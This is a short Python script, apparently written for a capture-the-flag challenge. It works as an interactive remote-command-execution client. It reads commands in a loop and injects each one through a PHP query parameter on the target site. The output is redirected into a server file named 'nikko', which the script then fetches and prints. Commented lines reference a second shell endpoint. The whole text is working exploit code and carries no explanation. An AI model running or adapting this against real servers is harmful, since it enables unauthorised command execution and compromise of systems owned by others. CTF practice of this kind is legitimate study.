import requests as  r 
output_file = "nikko"
url = "https://challshl.com/"
while True:
    input_command = input("Command: ")
    limit_shell = "index.php?_GET=nepska&_={0} > {1}".format(input_command, output_file)
    fixed_url   = url+limit_shell

    shell_fix   = url+"n.php?0={}".format(input_command)
    # print(shell_fix)
    # print(r.get(shell_fix).text)

    r.get(fixed_url)
    resnponse = r.get(url+"{}".format(output_file)).text
    print(resnponse)